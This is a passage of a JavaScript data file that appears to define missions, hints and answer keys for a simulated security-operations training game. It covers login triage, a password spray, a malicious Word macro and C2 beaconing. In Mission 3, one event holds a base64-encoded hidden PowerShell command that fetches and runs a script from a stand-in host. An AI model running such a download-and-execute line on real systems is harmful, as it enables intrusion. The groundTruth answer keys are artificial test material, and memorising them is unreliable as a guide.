export const CAMPAIGN_MISSIONS = [
  {
    id: 'mission-1-noisy-login',
    order: 1,
    title: 'Mission 1: The Noisy Login',
    subtitle: 'Alert Triage & Authentication Context',
    difficulty: 'Tutorial',
    estimatedMinutes: 8,
    xpReward: 200,
    minimumEvidenceRequired: 2,
    organization: 'Aegis BioLabs (Simulated Environment)',
    environment: 'Corporate IAM Portal & HR Workstation Subnet (10.20.14.0/24)',
    briefing: {
      summary:
        'At 08:14 UTC, the SIEM triggered an authentication threshold alert after user "analyst.test" (Elena Vance, HR Operations) recorded four consecutive failed login attempts followed by a successful login.',
      initialAlert: {
        alertId: 'ALT-1001',
        title: 'DET-001 / DET-003: Repeated Failed Logins Followed by Success',
        severity: 'medium',
        triggeredAt: '2026-10-20T08:14:22Z',
        entity: 'analyst.test (WKSTN-HR-02)'
      },
      knownFacts: [
        'User "analyst.test" is assigned to corporate laptop WKSTN-HR-02 (10.20.14.22).',
        'Aegis BioLabs enforced a mandatory 90-day password rotation at 08:00 UTC this morning.',
        'Four failed logins occurred between 08:12:05Z and 08:13:40Z, followed by a successful login at 08:14:22Z.'
      ],
      unknowns: [
        'Did the failed attempts originate from an external attacker IP or the user’s assigned workstation?',
        'Was hardware MFA verified on the successful login?',
        'Did any anomalous process execution or data access occur after login?'
      ],
      telemetrySources: ['iam_auth', 'directory_svc', 'edr_sensor', 'secure_proxy'],
      timeWindow: '2026-10-20 08:00 UTC – 08:25 UTC',
      consequencesOfPoorDecisions:
        'Disabling a legitimate employee account or isolating their workstation without checking context will disrupt morning HR payroll processing and reduce your Response Appropriateness score.'
    },
    objectives: [
      {
        id: 'obj-1-search',
        title: 'Filter or query authentication logs for "analyst.test"',
        type: 'run_search',
        minCount: 1
      },
      {
        id: 'obj-1-evidence',
        title: 'Collect at least 2 telemetry events establishing login origin and MFA/password reset context',
        type: 'collect_evidence',
        minCount: 2,
        requiredAnyIds: ['EVT-101', 'EVT-102', 'EVT-106', 'EVT-107'],
        minRequiredMatches: 2
      },
      {
        id: 'obj-1-detections',
        title: 'Run the Detection Engine to inspect which rules triggered and read their false-positive guidance',
        type: 'run_detections'
      },
      {
        id: 'obj-1-response',
        title: 'Select a proportionate disposition action (e.g., Close Alert as Benign)',
        type: 'execute_response',
        minCount: 1
      },
      {
        id: 'obj-1-report',
        title: 'Complete and submit the Incident Assessment Report',
        type: 'complete_assessment'
      }
    ],
    hints: [
      {
        level: 1,
        text: 'Start by running the query `username = "analyst.test"` in the Event Explorer and check the `sourceIp` and `host` fields across all authentication events.'
      },
      {
        level: 2,
        text: 'Look closely at EVT-101 (mandatory password rotation) and EVT-106 (successful login with hardware FIDO2 MFA from internal IP 10.20.14.22).'
      },
      {
        level: 3,
        text: 'Because the user was typing their old cached password from their own corporate workstation right after a scheduled password reset—and verified via FIDO2 MFA—this is Benign Activity (Low severity). Use "Close Alert as Benign" rather than disabling the account.'
      }
    ],
    events: [
      {
        eventId: 'EVT-101',
        timestamp: '2026-10-20T08:00:05Z',
        source: 'directory_svc',
        eventType: 'account_change',
        severity: 'low',
        host: 'DC-CORP-01',
        username: 'analyst.test',
        sourceIp: '10.20.1.10',
        action: 'password_policy_expired',
        result: 'success',
        message: 'Scheduled 90-day password expiration flag applied to account analyst.test (CHG-POLICY-90D).',
        tags: ['password_rotation', 'scheduled_policy'],
        metadata: { policyId: 'POL-IAM-90D', ticketId: 'AUTO-ROTATE-2026-10' }
      },
      {
        eventId: 'EVT-102',
        timestamp: '2026-10-20T08:12:05Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'low',
        host: 'WKSTN-HR-02',
        username: 'analyst.test',
        sourceIp: '10.20.14.22',
        action: 'user_login',
        result: 'failure',
        message: 'Authentication failed for analyst.test from assigned workstation WKSTN-HR-02 (reason: expired_or_invalid_password).',
        tags: ['internal_corp', 'failed_auth'],
        metadata: { authMethod: 'password', workstationAssignedOwner: 'analyst.test' }
      },
      {
        eventId: 'EVT-103',
        timestamp: '2026-10-20T08:12:38Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'low',
        host: 'WKSTN-HR-02',
        username: 'analyst.test',
        sourceIp: '10.20.14.22',
        action: 'user_login',
        result: 'failure',
        message: 'Authentication failed for analyst.test from WKSTN-HR-02 (reason: invalid_password).',
        tags: ['internal_corp', 'failed_auth'],
        metadata: { authMethod: 'password', attemptNumber: 2 }
      },
      {
        eventId: 'EVT-104',
        timestamp: '2026-10-20T08:13:11Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'medium',
        host: 'WKSTN-HR-02',
        username: 'analyst.test',
        sourceIp: '10.20.14.22',
        action: 'user_login',
        result: 'failure',
        message: 'Third consecutive authentication failure for analyst.test from WKSTN-HR-02.',
        tags: ['internal_corp', 'failed_auth'],
        metadata: { authMethod: 'password', attemptNumber: 3 }
      },
      {
        eventId: 'EVT-105',
        timestamp: '2026-10-20T08:13:55Z',
        source: 'directory_svc',
        eventType: 'account_change',
        severity: 'low',
        host: 'WKSTN-HR-02',
        username: 'analyst.test',
        sourceIp: '10.20.14.22',
        action: 'self_service_password_update',
        result: 'success',
        message: 'User analyst.test completed self-service password rotation via hardware security key verification.',
        tags: ['password_rotation', 'mfa_verified'],
        metadata: { mfaType: 'FIDO2_YubiKey', relatedEventIds: ['EVT-101', 'EVT-106'] }
      },
      {
        eventId: 'EVT-106',
        timestamp: '2026-10-20T08:14:22Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'low',
        host: 'WKSTN-HR-02',
        username: 'analyst.test',
        sourceIp: '10.20.14.22',
        action: 'user_login',
        result: 'success',
        message: 'Interactive login succeeded for analyst.test on WKSTN-HR-02 with FIDO2 hardware MFA.',
        tags: ['internal_corp', 'mfa_verified'],
        metadata: { mfaType: 'FIDO2_YubiKey', sessionTrust: 'high', relatedEventIds: ['EVT-105', 'EVT-107'] }
      },
      {
        eventId: 'EVT-107',
        timestamp: '2026-10-20T08:16:10Z',
        source: 'secure_proxy',
        eventType: 'web_proxy',
        severity: 'low',
        host: 'WKSTN-HR-02',
        username: 'analyst.test',
        sourceIp: '10.20.14.22',
        destinationIp: '10.20.5.40',
        domain: 'hr-portal.internal.example.com',
        action: 'http_get',
        result: 'success',
        message: 'Routine access to internal HR Benefits Portal dashboard.',
        tags: ['routine_business'],
        metadata: { statusCode: 200, bytesOut: 1420 }
      },
      {
        eventId: 'EVT-108',
        timestamp: '2026-10-20T08:18:00Z',
        source: 'edr_sensor',
        eventType: 'process_execution',
        severity: 'low',
        host: 'WKSTN-HR-02',
        username: 'analyst.test',
        processName: 'chrome.exe',
        parentProcess: 'explorer.exe',
        commandLine: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --profile-directory=Default',
        action: 'process_start',
        result: 'success',
        message: 'Standard browser startup by interactive user analyst.test.',
        tags: ['signed_binary'],
        metadata: { signatureStatus: 'Valid (Google LLC)' }
      }
    ],
    groundTruth: {
      classification: 'benign_activity',
      severity: 'low',
      affectedEntities: ['analyst.test', 'WKSTN-HR-02'],
      attackStages: [],
      expectedEvidenceIds: ['EVT-101', 'EVT-102', 'EVT-105', 'EVT-106'],
      bonusEvidenceIds: ['EVT-107'],
      expectedResponseActions: [
        {
          actionType: 'dismiss_benign',
          required: true,
          consequence: 'Alert closed as verified false positive caused by scheduled 90-day password expiration.'
        }
      ],
      explanation:
        'Although DET-001 and DET-003 triggered due to four failed logins followed by a success, correlating the IAM logs with directory service events reveals that a mandatory 90-day password expiration occurred at 08:00 UTC (EVT-101). All attempts originated from the user’s assigned internal workstation (10.20.14.22 / WKSTN-HR-02), the user updated their password via hardware FIDO2 MFA (EVT-105), and subsequent activity was routine HR portal work (EVT-107).'
    }
  },
  {
    id: 'mission-2-password-spray',
    order: 2,
    title: 'Mission 2: Password Spray',
    subtitle: 'Multi-Account Aggregation & Credential Access',
    difficulty: 'Easy',
    estimatedMinutes: 10,
    xpReward: 250,
    minimumEvidenceRequired: 3,
    organization: 'Aegis BioLabs (Simulated Environment)',
    environment: 'External VPN & SSO Edge Gateway',
    briefing: {
      summary:
        'The perimeter SSO gateway reported a burst of single-attempt authentication failures across multiple employee accounts within a 4-minute window, evading per-account lockout policies.',
      initialAlert: {
        alertId: 'ALT-2001',
        title: 'DET-002: Multi-Account Password Spraying From Single Source',
        severity: 'high',
        triggeredAt: '2026-10-20T11:04:15Z',
        entity: '198.51.100.24'
      },
      knownFacts: [
        'Per-account lockout triggers only after 5 failures on a single username.',
        'Multiple distinct usernames experienced single failed login attempts around 11:01–11:04 UTC.',
        'Legacy contractor accounts were recently migrated to the external SSO gateway.'
      ],
      unknowns: [
        'Which external IP address is conducting the password spray?',
        'How many distinct accounts were targeted?',
        'Did any targeted account authenticate successfully from the attacker IP?'
      ],
      telemetrySources: ['iam_auth', 'perimeter_fw', 'secure_proxy'],
      timeWindow: '2026-10-20 11:00 UTC – 11:15 UTC',
      consequencesOfPoorDecisions:
        'Failing to identify and disable an account that actually succeeded during a password spray leaves the adversary with active internal access.'
    },
    objectives: [
      {
        id: 'obj-2-search',
        title: 'Query authentication logs from external source IP 198.51.100.24',
        type: 'run_search',
        minCount: 1
      },
      {
        id: 'obj-2-evidence',
        title: 'Collect at least 3 evidence items showing the password spray pattern and the compromised account login',
        type: 'collect_evidence',
        minCount: 3,
        requiredAnyIds: ['EVT-201', 'EVT-205', 'EVT-206', 'EVT-207'],
        minRequiredMatches: 2
      },
      {
        id: 'obj-2-detections',
        title: 'Run the Detection Engine to verify threshold aggregation across distinct usernames',
        type: 'run_detections'
      },
      {
        id: 'obj-2-response',
        title: 'Block the attacker IP and contain the compromised user account',
        type: 'execute_response',
        minCount: 2
      },
      {
        id: 'obj-2-report',
        title: 'Submit the Incident Assessment Report',
        type: 'complete_assessment'
      }
    ],
    hints: [
      {
        level: 1,
        text: 'Run `sourceIp = "198.51.100.24" AND eventType = "authentication"` to see all login attempts from the external address.'
      },
      {
        level: 2,
        text: 'Check whether any event from `198.51.100.24` has `result = "success"`. Look closely at EVT-206 (`r.silva`) and the post-login directory harvest in EVT-207.'
      },
      {
        level: 3,
        text: 'Classify as Malicious Incident (High severity). Execute "Block External IP" on `198.51.100.24`, "Disable User Account" on `r.silva`, and "Revoke Active Sessions" on `r.silva`.'
      }
    ],
    events: [
      {
        eventId: 'EVT-201',
        timestamp: '2026-10-20T11:01:10Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'medium',
        host: 'SSO-GW-01',
        username: 'a.patel',
        sourceIp: '198.51.100.24',
        action: 'user_login',
        result: 'failure',
        message: 'SSO login failed for a.patel from 198.51.100.24 (User-Agent: python-requests/2.31.0).',
        tags: ['external_ip', 'failed_auth', 'automated_ua'],
        metadata: { userAgent: 'python-requests/2.31.0', asn: 'AS64496-DOC-NET' }
      },
      {
        eventId: 'EVT-202',
        timestamp: '2026-10-20T11:01:40Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'medium',
        host: 'SSO-GW-01',
        username: 'b.morgan',
        sourceIp: '198.51.100.24',
        action: 'user_login',
        result: 'failure',
        message: 'SSO login failed for b.morgan from 198.51.100.24 (User-Agent: python-requests/2.31.0).',
        tags: ['external_ip', 'failed_auth', 'automated_ua'],
        metadata: { userAgent: 'python-requests/2.31.0' }
      },
      {
        eventId: 'EVT-203',
        timestamp: '2026-10-20T11:02:12Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'medium',
        host: 'SSO-GW-01',
        username: 'c.nguyen',
        sourceIp: '198.51.100.24',
        action: 'user_login',
        result: 'failure',
        message: 'SSO login failed for c.nguyen from 198.51.100.24 (User-Agent: python-requests/2.31.0).',
        tags: ['external_ip', 'failed_auth', 'automated_ua'],
        metadata: { userAgent: 'python-requests/2.31.0' }
      },
      {
        eventId: 'EVT-204',
        timestamp: '2026-10-20T11:02:45Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'medium',
        host: 'SSO-GW-01',
        username: 'd.kim',
        sourceIp: '198.51.100.24',
        action: 'user_login',
        result: 'failure',
        message: 'SSO login failed for d.kim from 198.51.100.24 (User-Agent: python-requests/2.31.0).',
        tags: ['external_ip', 'failed_auth', 'automated_ua'],
        metadata: { userAgent: 'python-requests/2.31.0' }
      },
      {
        eventId: 'EVT-205',
        timestamp: '2026-10-20T11:03:18Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'medium',
        host: 'SSO-GW-01',
        username: 's.okafor',
        sourceIp: '198.51.100.24',
        action: 'user_login',
        result: 'failure',
        message: 'SSO login failed for s.okafor from 198.51.100.24 (User-Agent: python-requests/2.31.0).',
        tags: ['external_ip', 'failed_auth', 'automated_ua'],
        metadata: { userAgent: 'python-requests/2.31.0' }
      },
      {
        eventId: 'EVT-206',
        timestamp: '2026-10-20T11:03:50Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'high',
        host: 'SSO-GW-01',
        username: 'r.silva',
        sourceIp: '198.51.100.24',
        action: 'user_login',
        result: 'success',
        message: 'SSO login succeeded for legacy contractor account r.silva from 198.51.100.24 without MFA challenge (legacy_mfa_exempt).',
        tags: ['external_ip', 'anomalous_geo', 'mfa_bypass_legacy'],
        metadata: { userAgent: 'python-requests/2.31.0', mfaEnforced: false, relatedEventIds: ['EVT-201', 'EVT-207'] }
      },
      {
        eventId: 'EVT-207',
        timestamp: '2026-10-20T11:05:14Z',
        source: 'secure_proxy',
        eventType: 'web_proxy',
        severity: 'high',
        host: 'SSO-GW-01',
        username: 'r.silva',
        sourceIp: '198.51.100.24',
        destinationIp: '10.20.2.15',
        domain: 'directory-api.internal.example.com',
        action: 'http_get',
        result: 'success',
        message: 'Account r.silva downloaded full Global Address List export (/api/v2/users/export.csv) from 198.51.100.24.',
        tags: ['reconnaissance', 'bulk_export'],
        metadata: { statusCode: 200, bytesOut: 482900, relatedEventIds: ['EVT-206'] }
      },
      {
        eventId: 'EVT-208',
        timestamp: '2026-10-20T11:06:00Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'low',
        host: 'WKSTN-ENG-01',
        username: 'a.patel',
        sourceIp: '10.20.12.11',
        action: 'user_login',
        result: 'success',
        message: 'Normal internal workstation login for a.patel on WKSTN-ENG-01 with hardware MFA.',
        tags: ['internal_corp', 'mfa_verified'],
        metadata: { mfaType: 'FIDO2' }
      }
    ],
    groundTruth: {
      classification: 'malicious_incident',
      severity: 'high',
      affectedEntities: ['r.silva', '198.51.100.24', 'SSO-GW-01'],
      attackStages: ['T1110.003', 'T1078'],
      expectedEvidenceIds: ['EVT-201', 'EVT-205', 'EVT-206', 'EVT-207'],
      bonusEvidenceIds: ['EVT-202', 'EVT-203', 'EVT-204'],
      expectedResponseActions: [
        {
          actionType: 'block_ip',
          target: '198.51.100.24',
          required: true,
          consequence: 'Perimeter firewall blocked further password spraying and API requests from 198.51.100.24.'
        },
        {
          actionType: 'disable_account',
          target: 'r.silva',
          required: true,
          consequence: 'Compromised contractor account r.silva disabled.'
        },
        {
          actionType: 'revoke_sessions',
          target: 'r.silva',
          required: false,
          consequence: 'Active SSO session token for r.silva invalidated.'
        }
      ],
      explanation:
        'External IP 198.51.100.24 executed a password spray using `python-requests/2.31.0` across six accounts at ~30-second intervals (EVT-201 through EVT-206). While five accounts failed, legacy contractor account `r.silva` had an MFA exemption and authenticated successfully (EVT-206), immediately exporting the corporate Global Address List (EVT-207).'
    }
  },
  {
    id: 'mission-3-suspicious-script',
    order: 3,
    title: 'Mission 3: The Suspicious Script',
    subtitle: 'Process Lineage, Encoded Commands & False-Positive Discrimination',
    difficulty: 'Easy to Medium',
    estimatedMinutes: 12,
    xpReward: 300,
    minimumEvidenceRequired: 3,
    organization: 'Aegis BioLabs (Simulated Environment)',
    environment: 'Finance & IT Endpoint Fleet',
    briefing: {
      summary:
        'EDR sensors flagged two endpoints executing PowerShell with encoded parameters within the same 15-minute window: WKSTN-IT-01 and WKSTN-FIN-04. You must inspect parent-child process trees and command-line context to distinguish authorized administration from malicious execution.',
      initialAlert: {
        alertId: 'ALT-3001',
        title: 'DET-005 / DET-006: Suspicious Parent Process & Encoded PowerShell Execution',
        severity: 'critical',
        triggeredAt: '2026-10-20T13:22:18Z',
        entity: 'WKSTN-FIN-04 / WKSTN-IT-01'
      },
      knownFacts: [
        'Corporate policy permits signed SCCM client scripts spawned by CcmExec.exe under SYSTEM.',
        'Microsoft Office applications (winword.exe, excel.exe) are prohibited from spawning command shells.',
        'Note: All command lines in this simulator are fictional text strings and are never executed.'
      ],
      unknowns: [
        'Which endpoint is running a legitimate SCCM maintenance script?',
        'Which endpoint executed a malicious macro payload, and what file did it stage on disk?'
      ],
      telemetrySources: ['edr_sensor', 'file_integrity', 'dns_resolver'],
      timeWindow: '2026-10-20 13:15 UTC – 13:30 UTC',
      consequencesOfPoorDecisions:
        'Isolating WKSTN-IT-01 will interrupt legitimate enterprise patch telemetry, whereas failing to isolate WKSTN-FIN-04 leaves an active macro-staged implant running.'
    },
    objectives: [
      {
        id: 'obj-3-search',
        title: 'Query process execution events containing "powershell"',
        type: 'run_search',
        minCount: 1
      },
      {
        id: 'obj-3-evidence',
        title: 'Collect at least 3 evidence items showing the malicious Office parent process, encoded command, and dropped script on WKSTN-FIN-04',
        type: 'collect_evidence',
        minCount: 3,
        requiredAnyIds: ['EVT-304', 'EVT-305', 'EVT-306', 'EVT-307'],
        minRequiredMatches: 3
      },
      {
        id: 'obj-3-detections',
        title: 'Run the Detection Engine to see how exclusion logic handles CcmExec.exe vs. winword.exe',
        type: 'run_detections'
      },
      {
        id: 'obj-3-response',
        title: 'Isolate the compromised finance workstation and quarantine the staged payload',
        type: 'execute_response',
        minCount: 2
      },
      {
        id: 'obj-3-report',
        title: 'Submit the Incident Assessment Report',
        type: 'complete_assessment'
      }
    ],
    hints: [
      {
        level: 1,
        text: 'Run `processName CONTAINS "powershell"` and compare `parentProcess` on WKSTN-IT-01 (`CcmExec.exe`) versus WKSTN-FIN-04 (`winword.exe`).'
      },
      {
        level: 2,
        text: 'Inspect EVT-304, EVT-305, and EVT-306 on `WKSTN-FIN-04`: `winword.exe` opened `Invoice_Q3_Rev.docm` and spawned `powershell.exe -nop -w hidden -EncodedCommand ...`, dropping `C:\\Users\\m.chen\\AppData\\Local\\Temp\\audit_helper.ps1`.'
      },
      {
        level: 3,
        text: 'Classify as Malicious Incident (High/Critical severity) affecting `WKSTN-FIN-04` and `m.chen`. Execute "Isolate Endpoint" on `WKSTN-FIN-04` and "Quarantine File" on `audit_helper.ps1`.'
      }
    ],
    events: [
      {
        eventId: 'EVT-301',
        timestamp: '2026-10-20T13:16:04Z',
        source: 'edr_sensor',
        eventType: 'process_execution',
        severity: 'low',
        host: 'WKSTN-IT-01',
        username: 'SYSTEM',
        processName: 'powershell.exe',
        parentProcess: 'CcmExec.exe',
        commandLine: 'powershell.exe -NoProfile -EncodedCommand UwBlAHQALQBDAG8AcgBwAEkAbgB2AGUAbgB0AG8AcgB5AA==',
        action: 'process_start',
        result: 'success',
        message: 'SCCM agent CcmExec.exe executed signed inventory check script (CHG-IT-4012).',
        tags: ['signed_script', 'sccm_maintenance'],
        metadata: { decodedPreview: 'Set-CorpInventory -ReportMode Daily', signature: 'Verified CorpIT CodeSign' }
      },
      {
        eventId: 'EVT-302',
        timestamp: '2026-10-20T13:16:08Z',
        source: 'file_integrity',
        eventType: 'file_activity',
        severity: 'low',
        host: 'WKSTN-IT-01',
        username: 'SYSTEM',
        processName: 'powershell.exe',
        action: 'file_write',
        result: 'success',
        message: 'Wrote daily SCCM hardware inventory log C:\\Windows\\CCM\\Logs\\InventoryDaily.log.',
        tags: ['sccm_maintenance'],
        metadata: { filePath: 'C:\\Windows\\CCM\\Logs\\InventoryDaily.log' }
      },
      {
        eventId: 'EVT-303',
        timestamp: '2026-10-20T13:21:40Z',
        source: 'file_integrity',
        eventType: 'file_activity',
        severity: 'medium',
        host: 'WKSTN-FIN-04',
        username: 'm.chen',
        processName: 'outlook.exe',
        action: 'file_create',
        result: 'success',
        message: 'Saved email attachment C:\\Users\\m.chen\\Downloads\\Invoice_Q3_Rev.docm (Mark-of-the-Web present).',
        tags: ['email_attachment', 'macro_document'],
        metadata: { filePath: 'C:\\Users\\m.chen\\Downloads\\Invoice_Q3_Rev.docm', sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
      },
      {
        eventId: 'EVT-304',
        timestamp: '2026-10-20T13:22:02Z',
        source: 'edr_sensor',
        eventType: 'process_execution',
        severity: 'medium',
        host: 'WKSTN-FIN-04',
        username: 'm.chen',
        processName: 'winword.exe',
        parentProcess: 'explorer.exe',
        commandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\m.chen\\Downloads\\Invoice_Q3_Rev.docm"',
        action: 'process_start',
        result: 'success',
        message: 'User m.chen opened macro-enabled document Invoice_Q3_Rev.docm in Microsoft Word.',
        tags: ['macro_document'],
        metadata: { relatedEventIds: ['EVT-303', 'EVT-305'] }
      },
      {
        eventId: 'EVT-305',
        timestamp: '2026-10-20T13:22:18Z',
        source: 'edr_sensor',
        eventType: 'process_execution',
        severity: 'critical',
        host: 'WKSTN-FIN-04',
        username: 'm.chen',
        processName: 'powershell.exe',
        parentProcess: 'winword.exe',
        commandLine: 'powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwB0AGEAZwBpAG4AZwAuAGUAeABhAG0AcABsAGUAbgBlAHQALwBhAHUAZABpAHQALgBwAHMAMQAnACkA',
        action: 'process_start',
        result: 'success',
        message: 'Suspicious child process: winword.exe spawned hidden PowerShell with Base64 EncodedCommand.',
        tags: ['encoded_cmd', 'suspicious_parent'],
        metadata: {
          decodedSimulatedString: '[FICTIONAL SIMULATION PAYLOAD] DownloadString("http://staging.example.net/audit.ps1") -> C:\\Users\\m.chen\\AppData\\Local\\Temp\\audit_helper.ps1',
          relatedEventIds: ['EVT-304', 'EVT-306']
        }
      },
      {
        eventId: 'EVT-306',
        timestamp: '2026-10-20T13:22:24Z',
        source: 'file_integrity',
        eventType: 'file_activity',
        severity: 'high',
        host: 'WKSTN-FIN-04',
        username: 'm.chen',
        processName: 'powershell.exe',
        parentProcess: 'winword.exe',
        action: 'file_create',
        result: 'success',
        message: 'PowerShell created unsigned script C:\\Users\\m.chen\\AppData\\Local\\Temp\\audit_helper.ps1.',
        tags: ['unsigned_script', 'temp_staging'],
        metadata: { filePath: 'C:\\Users\\m.chen\\AppData\\Local\\Temp\\audit_helper.ps1', relatedEventIds: ['EVT-305', 'EVT-307'] }
      },
      {
        eventId: 'EVT-307',
        timestamp: '2026-10-20T13:22:29Z',
        source: 'dns_resolver',
        eventType: 'dns_query',
        severity: 'high',
        host: 'WKSTN-FIN-04',
        username: 'm.chen',
        sourceIp: '10.20.18.44',
        destinationIp: '203.0.113.55',
        domain: 'staging.example.net',
        processName: 'powershell.exe',
        action: 'dns_lookup',
        result: 'success',
        message: 'powershell.exe queried external staging domain staging.example.net (resolved to 203.0.113.55).',
        tags: ['suspicious_domain'],
        metadata: { queryType: 'A', resolvedIp: '203.0.113.55', relatedEventIds: ['EVT-305'] }
      }
    ],
    groundTruth: {
      classification: 'malicious_incident',
      severity: 'high',
      affectedEntities: ['WKSTN-FIN-04', 'm.chen', 'audit_helper.ps1'],
      attackStages: ['T1059.001', 'T1027'],
      expectedEvidenceIds: ['EVT-304', 'EVT-305', 'EVT-306', 'EVT-307'],
      bonusEvidenceIds: ['EVT-301', 'EVT-303'],
      expectedResponseActions: [
        {
          actionType: 'isolate_host',
          target: 'WKSTN-FIN-04',
          required: true,
          consequence: 'Workstation WKSTN-FIN-04 isolated from corporate network.'
        },
        {
          actionType: 'quarantine_file',
          target: ['audit_helper.ps1', 'Invoice_Q3_Rev.docm'],
          required: true,
          consequence: 'Malicious macro staging script quarantined on WKSTN-FIN-04.'
        }
      ],
      explanation:
        'While WKSTN-IT-01 ran a legitimate, signed SCCM inventory script spawned by `CcmExec.exe` under `SYSTEM` (EVT-301), WKSTN-FIN-04 experienced a real macro intrusion: user `m.chen` opened `Invoice_Q3_Rev.docm` (EVT-304), causing `winword.exe` to spawn hidden `powershell.exe -EncodedCommand` (EVT-305), drop `audit_helper.ps1` in Temp (EVT-306), and query `staging.example.net` (EVT-307).'
    }
  },
  {
    id: 'mission-4-strange-domain',
    order: 4,
    title: 'Mission 4: The Strange Domain',
    subtitle: 'DNS Telemetry, IP Pivoting & C2 Beaconing Correlation',
    difficulty: 'Medium',
    estimatedMinutes: 14,
    xpReward: 325,
    minimumEvidenceRequired: 3,
    organization: 'Aegis BioLabs (Simulated Environment)',
    environment: 'R&D Engineering Subnet (10.20.30.0/24)',
    briefing: {
      summary:
        'Internal DNS resolvers flagged queries from engineering workstation WKSTN-ENG-07 to an uncategorized domain (`cdn-telemetry-sync.example.net`). You must pivot across DNS, firewall, web proxy, and EDR telemetry to determine whether this is isolated browser traffic or active Command-and-Control (C2) beaconing.',
      initialAlert: {
        alertId: 'ALT-4001',
        title: 'DET-009 / DET-010: Suspicious Domain Resolution & Periodic Outbound Egress',
        severity: 'high',
        triggeredAt: '2026-10-20T15:04:00Z',
        entity: 'WKSTN-ENG-07 / cdn-telemetry-sync.example.net'
      },
      knownFacts: [
        'All indicators in this scenario use reserved example domains (`*.example.net`) and documentation IPs (`203.0.113.0/24`).',
        'Workstation WKSTN-ENG-07 is assigned to embedded systems engineer `k.lindqvist` (10.20.30.17).'
      ],
      unknowns: [
        'What IP address does `cdn-telemetry-sync.example.net` resolve to?',
        'Which local process on WKSTN-ENG-07 is initiating the DNS lookups and outbound connections?',
        'Is the traffic a one-off browser visit or a periodic automated beacon?'
      ],
      telemetrySources: ['dns_resolver', 'perimeter_fw', 'secure_proxy', 'edr_sensor'],
      timeWindow: '2026-10-20 15:00 UTC – 15:10 UTC',
      consequencesOfPoorDecisions:
        'Blocking only the domain without blocking the resolved C2 IP or isolating the infected host allows hardcoded IP fallback beacons to continue.'
    },
    objectives: [
      {
        id: 'obj-4-search',
        title: 'Pivot on domain "cdn-telemetry-sync.example.net" or destination IP "203.0.113.88"',
        type: 'run_search',
        minCount: 1
      },
      {
        id: 'obj-4-timeline',
        title: 'Inspect the Investigation Timeline to observe the 60-second beacon interval',
        type: 'inspect_timeline'
      },
      {
        id: 'obj-4-evidence',
        title: 'Collect at least 3 evidence records linking the unsigned process, DNS resolution, and periodic C2 POST beacons',
        type: 'collect_evidence',
        minCount: 3,
        requiredAnyIds: ['EVT-402', 'EVT-403', 'EVT-404', 'EVT-406', 'EVT-407'],
        minRequiredMatches: 3
      },
      {
        id: 'obj-4-response',
        title: 'Sinkhole the C2 domain, block the C2 IP, and isolate WKSTN-ENG-07',
        type: 'execute_response',
        minCount: 2
      },
      {
        id: 'obj-4-report',
        title: 'Submit the Incident Assessment Report',
        type: 'complete_assessment'
      }
    ],
    hints: [
      {
        level: 1,
        text: 'Search for `domain = "cdn-telemetry-sync.example.net" OR destinationIp = "203.0.113.88"` to view all related network and DNS events.'
      },
      {
        level: 2,
        text: 'Look at EVT-402: an unsigned binary `C:\\Users\\k.lindqvist\\AppData\\Roaming\\SyncClient\\netcheck.exe` started and immediately began sending periodic HTTP POST beacons every 60 seconds (15:02, 15:03, 15:04 UTC).'
      },
      {
        level: 3,
        text: 'Classify as Malicious Incident (High severity). Execute "Sinkhole / Block Domain" on `cdn-telemetry-sync.example.net`, "Block External IP" on `203.0.113.88`, and "Isolate Endpoint" on `WKSTN-ENG-07`.'
      }
    ],
    events: [
      {
        eventId: 'EVT-401',
        timestamp: '2026-10-20T15:00:12Z',
        source: 'dns_resolver',
        eventType: 'dns_query',
        severity: 'low',
        host: 'WKSTN-ENG-07',
        username: 'k.lindqvist',
        sourceIp: '10.20.30.17',
        destinationIp: '192.0.2.50',
        domain: 'docs.vendor-sdk.example.org',
        processName: 'chrome.exe',
        action: 'dns_lookup',
        result: 'success',
        message: 'Standard browser DNS lookup for vendor documentation site.',
        tags: ['routine_business'],
        metadata: { queryType: 'A' }
      },
      {
        eventId: 'EVT-402',
        timestamp: '2026-10-20T15:01:58Z',
        source: 'edr_sensor',
        eventType: 'process_execution',
        severity: 'high',
        host: 'WKSTN-ENG-07',
        username: 'k.lindqvist',
        processName: 'netcheck.exe',
        parentProcess: 'explorer.exe',
        commandLine: '"C:\\Users\\k.lindqvist\\AppData\\Roaming\\SyncClient\\netcheck.exe" --daemon --interval 60',
        action: 'process_start',
        result: 'success',
        message: 'Unsigned binary netcheck.exe executed from user Roaming AppData directory.',
        tags: ['unsigned_binary', 'appdata_exec'],
        metadata: { signatureStatus: 'Unsigned', sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08', relatedEventIds: ['EVT-403', 'EVT-404'] }
      },
      {
        eventId: 'EVT-403',
        timestamp: '2026-10-20T15:02:00Z',
        source: 'dns_resolver',
        eventType: 'dns_query',
        severity: 'high',
        host: 'WKSTN-ENG-07',
        username: 'k.lindqvist',
        sourceIp: '10.20.30.17',
        destinationIp: '203.0.113.88',
        domain: 'cdn-telemetry-sync.example.net',
        processName: 'netcheck.exe',
        action: 'dns_lookup',
        result: 'success',
        message: 'netcheck.exe queried newly observed domain cdn-telemetry-sync.example.net -> 203.0.113.88.',
        tags: ['suspicious_domain', 'c2_beacon'],
        metadata: { resolvedIp: '203.0.113.88', ttl: 60, relatedEventIds: ['EVT-402', 'EVT-404'] }
      },
